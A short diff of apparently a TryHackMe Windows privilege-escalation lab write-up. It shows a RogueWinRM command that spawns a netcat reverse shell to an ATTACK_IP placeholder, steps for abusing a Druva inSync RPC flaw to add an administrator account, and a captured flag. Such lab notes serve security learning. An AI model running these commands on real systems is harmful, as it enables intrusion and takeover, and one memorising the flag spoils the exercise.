@@ -222,3 +222,12 @@ the exploit is already in the tools folder so run:
 c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACK_IP 4448"
 
 and you should get a reverse shell in your netcat listener.
+
+
+# Software exploitation (unpatched software)
+
+Theres a vulnerability in the Druva insync app that is exploits it's RPC function that will run any command. The exploit is already on the machine just change the cmd = "" line to include a password and add to the adminstrator account as the page says.
+
+Then open a powershell as admin and get your key. Simples!
+PS C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt                                                    
+THM{EZ_DLL_PROXY_4ME}  
